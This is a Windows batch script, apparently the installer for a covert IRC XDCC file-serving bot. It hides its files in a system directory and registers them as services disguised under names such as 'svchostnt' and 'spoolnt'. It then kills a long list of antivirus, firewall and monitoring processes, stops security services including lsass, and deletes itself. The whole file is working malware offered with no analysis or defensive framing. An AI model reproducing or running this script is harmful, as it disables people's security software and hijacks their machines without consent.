@echo off
cd %SYSTEMROOT%\system32\drivers\etc\system
echo user_nick [XDCC-[N]House]_ >> 1.dll

echo uploaddir %SYSTEMROOT%/system32/drivers/etc/system >> 1.dll

echo DirChangeMesFile=%SYSTEMROOT%\system32\drivers\etc\system\chdir.txt >> spool.ini
echo SignOn=%SYSTEMROOT%\system32\drivers\etc\system\stats.txt >> spool.ini
echo HomeDir=%SYSTEMROOT%\system32\drivers\etc\system >> spool.ini

SET MXHOME=%SYSTEMROOT%\system32\drivers\etc\system
SET MXBIN=%SYSTEMROOT%\system32\drivers\etc\system
servicesnt -i spoolnt "%SYSTEMROOT%\system32\drivers\etc\system" "%SYSTEMROOT%\system32\drivers\etc\system\spool.exe" "%SYSTEMROOT%\system32\drivers\etc\system\spool.ini" Y 0 0 N Y
servicesnt -i svchostnt "%SYSTEMROOT%\system32\drivers\etc\system" "%SYSTEMROOT%\system32\drivers\etc\system\svchost.exe" "%SYSTEMROOT%\system32\drivers\etc\system\1.dll" Y 0 0 Y Y

net start spoolnt
net start svchostnt
drives.exe
regedit /s %SYSTEMROOT%\system32\drivers\etc\system\load.reg

attrib +s +h %SYSTEMROOT%/system32/drivers
attrib +s +h %SYSTEMROOT%/system32/drivers/etc
attrib +s +h %SYSTEMROOT%/system32/drivers/etc/system

pskill ntlogonwrk
pskill slimftpd
pskill cideamon
pskill servudaemon
pskill iroffer
pskill cygwin1
pskill atguard
pskill atro55en
pskill atupdater
pskill atwatch
pskill aupdate
pskill autodown
pskill autotrace
pskill autoupdate
pskill avconsol
pskill ave32
pskill avgcc32
pskill avgctrl
pskill avgserv
pskill avgserv9
pskill avgw
pskill avkpop
pskill avkserv
pskill avkservice
pskill avkwcl9
pskill avkwctl9
pskill avnt
pskill avp
pskill avp32
pskill avpcc
pskill avpdos32
pskill avpexec
pskill avpinst
pskill avpm
pskill avpmon
pskill avpnt
pskill avptc32
pskill avpupd
pskill avrescue
pskill avsched32
pskill avsynmgr
pskill avwin95
pskill avwinnt
pskill avwupd32
pskill avxmonitor9x
pskill avxmonitornt
pskill avxquar
pskill avxw
pskill azonealarm
pskill bd_professional
pskill bidef
pskill bidserver
pskill bipcp
pskill bipcpevalsetup
pskill bisp
pskill blackd
pskill blackice
pskill bootwarn
pskill borg2
pskill bs120
pskill ccapp
pskill ccevtmgr
pskill ccpxysvc
pskill ccsetmgr
pskill ccshtdwn
pskill cdp
pskill cfgwiz
pskill cfiadmin
pskill cfiaudit
pskill cfind
pskill cfinet
pskill cfinet32
pskill claw95
pskill claw95cf
pskill claw95ct
pskill clean
pskill cleaner
pskill cleaner3
pskill cleanpc
pskill evpn
pskill exantivirus-cnet
pskill expert
pskill f-agnt95
pskill fameh32
pskill fast
pskill fch32
pskill fire
pskill firedaemon
pskill fih32
pskill findviru
pskill firewall
pskill fix-it
pskill flowprotector
pskill fnrb32
pskill fprot
pskill f-prot
pskill fprot95
pskill f-prot95
pskill iface
pskill ifw2000
pskill iomon98
pskill iparmor
pskill iris
pskill isrv95
pskill jammer
pskill jed
pskill jedi
pskill kavlite40eng
pskill kavpers40eng
pskill kerio-pf-213-en-win
pskill kerio-wrl-421-en-win
pskill kerio-wrp-421-en-win
pskill killprocesssetup161
pskill kpf
pskill kpfw32
pskill ldnetmon
pskill ldpro
pskill ldpromenu
pskill ldscan
pskill localnet
pskill lockdown
pskill lockdown2000
pskill lookout
pskill lsetup
pskill luall
pskill luau
pskill lucomserver
pskill luinit
pskill luspt
pskill mcagent
pskill mcmnhdlr
pskill mcshield
pskill mctool
pskill mcupdate
pskill mcvsrte
pskill mcvsshld
pskill mfw2en
pskill mfweng3.02d30
pskill mgavrtcl
pskill mgavrte
pskill mghtml
pskill mgui
pskill minilog
pskill monitor
pskill monsys32
pskill monsysnt
pskill monwow
pskill moolive
pskill mpfagent
pskill mpfservice
pskill mpftray
pskill mrflux
pskill msblast
pskill msconfig
pskill msinfo32
pskill mspatch
pskill mssmmc32
pskill mu0311ad
pskill mwatch
pskill mxtask
pskill n32scan
pskill n32scanw
pskill nai_vs_stat
pskill nav32_loader
pskill nav80try
pskill navap
pskill navapsvc
pskill navapw32
pskill navauto-protect
pskill navdx
pskill naveng
pskill navengnavex15
pskill navex15
pskill navlu32
pskill navnt
pskill navrunr
pskill navsched
pskill navstub
pskill navw
pskill navw32
pskill navwnt
pskill nc2000
pskill ncinst4
pskill ndd32
pskill neomonitor
pskill neowatchlog
pskill netarmor
pskill netinfo
pskill netmon
pskill netscanpro
pskill netspyhunter-1.2
pskill netstat
pskill netutils
pskill nisserv
pskill nisum
pskill nmain
pskill nod32
pskill normist
pskill norton_internet_secu_3.0_407
pskill notstart
pskill npf40_tw_98_nt_me_2k
pskill npfmessenger
pskill nprotect
pskill npscheck
pskill npssvc
pskill nsched32
pskill nsplugin
pskill ntrtscan
pskill ntvdm
pskill ntxconfig
pskill nui
pskill nupdate
pskill nupgrade
pskill nvapsvc
pskill nvarch16
pskill nvc95
pskill nvlaunch
pskill nvsvc32
pskill nwinst4
pskill nwservice
pskill nwtool16
pskill offguard
pskill ogrc
pskill ostronet
pskill outpost
pskill outpostinstall
pskill outpostproinstall
pskill padmin
pskill panixk
pskill pathping
pskill pavcl
pskill pavproxy
pskill pavsched
pskill pavw
pskill pcc2002s902
pskill pcc2k_76_1436
pskill pccclient
pskill pccguide
pskill pcciomon
pskill pccmain
pskill pccntmon
pskill pccpfw
pskill pccwin97
pskill pccwin98
pskill pcdsetup
pskill pcfwallicon
pskill pcip10117_0
pskill pcscan
pskill pcscanpdsetup
pskill penis32
pskill periscope
pskill persfw
pskill perswf
pskill pf2
pskill pfwadmin
pskill ping
pskill pingscan
pskill platin
pskill pop3trap
pskill poproxy
pskill popscan
pskill portdetective
pskill portmonitor
pskill ppinupdt
pskill pptbc
pskill ppvstop
pskill processmonitor
pskill procexplorerv1.0
pskill programauditor
pskill proport
pskill protectx
pskill pspf
pskill purge
pskill pview
pskill pview95
pskill qconsole
pskill qserver
pskill rapapp
pskill rav
pskill rav7
pskill rav7win
pskill rav8win32eng
pskill realmon
pskill regedit
pskill rescue
pskill rescue32
pskill route
pskill routemon
pskill rrguard
pskill rshell
pskill rtvscn95
pskill rulaunch
pskill safeweb
pskill sbserv
pskill scan32
pskill scan95
pskill scanpm
pskill schedapp
pskill scrscan
pskill winsrv
pskill msconfig
pskill winconfig
pskill scvhosl
pskill sd
pskill serv95
pskill setup_flowprotector_us
pskill setupvameeval
pskill sfc
pskill sgssfw32
pskill sh
pskill sharedaccess
pskill shellspyinstall
pskill shn
pskill smc
pskill iroffer
pskill servu
pskill svchst
pskill firedaemon
pskill sofi
pskill spf
pskill sphinx
pskill spider
pskill spyxx
pskill srwatch
pskill ss3edit
pskill st2
pskill supftrl
pskill supporter5
pskill sweep
pskill sweep95
pskill sweepnet
pskill sweepsrv.sys
pskill swnetsup
pskill symproxysvc
pskill symtray
pskill sysdoc32
pskill sysedit
pskill syshelp
pskill taskmon
pskill taumon
pskill tauscan
pskill tbscan
pskill tc
pskill tca
pskill tcm
pskill tcpsvs32
pskill tds2
pskill tds2-98
pskill tds2-nt
pskill tds-3
pskill tfak
pskill tfak5
pskill tftpd
pskill tgbob
pskill titanin
pskill titaninxp
pskill tmntsrv
pskill tracerpt
pskill tracert
pskill trjscan
pskill trjsetup
pskill trojantrap3
pskill undoboot
pskill update
pskill vbcmserv
pskill vbcons
pskill vbust
pskill vbwin9x
pskill vbwinntw
pskill vccmserv
pskill vcleaner
pskill vcontrol
pskill vcsetup
pskill vet32
pskill vet95
pskill vet98
pskill vettray
pskill vfsetup
pskill vir-help
pskill virusmdpersonalfirewall
pskill vnlan300
pskill vnpc3000
pskill vpc32
pskill vpc42
pskill vpfw30s
pskill vptray
pskill vscan
pskill spoolsv
pskill ccpxysvc
pskill cookiepatrol
pskill msmsgs
pskill isplog
pskill sc.exe
pskill MonSvcNT.exe
pskill MonSysNT.exe
pskill msgfix.exe
pskill ntlogonwrk.exe
pskill ntlogon.exe
pskill winnt32.exe
pskill slimftpd.exe
pskill vrmonsvc.exe
pskill ADSpider.exe
pskill TvMonSvc.exe
pskill ctfmon.exe
pskill servudaemon.exe
pskill messenger.exe
pskill nprotect.exe
pskill iroffer.exe
pskill firedaemon.exe
pskill DefWatch.exe
pskill SpiderNT.exe
pskill WLanSvc.exe
pskill turboagent.exe
pskill vcrmon.exe

net stop "Remote Registry Service" 
net stop "telnet" 
net stop "messenger" 
net stop "servu"
net stop "serv-u"
net stop "iroffer"
net stop "winserv"
net stop "winsrv"
net stop "ntsysvers"
net stop "svchost"
net stop "svchost1"
net stop "svchost2"
net stop "iro"
net stop "svkksot"
net stop "mirc"
net stop "mirc32"
net stop "gtask"
net stop "ftask"
net stop "secure"
net stop "secur"
net stop "firedaemon"
net stop "hidden32"
net stop "office"
net stop "lsass"
net stop "FireDaemon"
net stop "Ahnlab Task Scheduler"
net stop "Panda Antivirus"
net stop "ZoneAlarm"
net stop "Detector de OfficeScanNT"
net stop "Symantec Proxy Service"
net stop "Symantec Event Manager"
net stop "Norton Internet Security Accounts Manager"
net stop "Norton AntiVirus Server"
net stop "Norton AntiVirus Auto Protect Service"
net stop "Norton AntiVirus Client"
net stop "Norton AntiVirus Corporate Edition"
net stop "ViRobot Professional Monitoring"
net stop "PC-cillin Personal Firewall"
net stop "Trend Micro Proxy Service"
net stop "Trend NT Realtime Service"
net stop "McAfee.com McShield"
net stop "McAfee.com VirusScan Online Realtime Engine"
net stop "McAfee Agent"
net stop "McShield"
net stop "SyGateService"
net stop "Sygate Personal Firewall Pro"
net stop "Sygate Personal Firewall"
net stop "Sophos Anti-Virus"
net stop "Sophos Anti-Virus Network"
net stop "eTrust Antivirus Job Server"
net stop "eTrust Antivirus Realtime Server"
net stop "eTrust Antivirus RPC Server"
net stop "ViRobot Expert Monitoring"
net stop "ViRobot Lite Monitoring"
net stop "Quick Heal Online Protection"
net stop "V3MonNT"
net stop "V3MonSvc"

del update.bat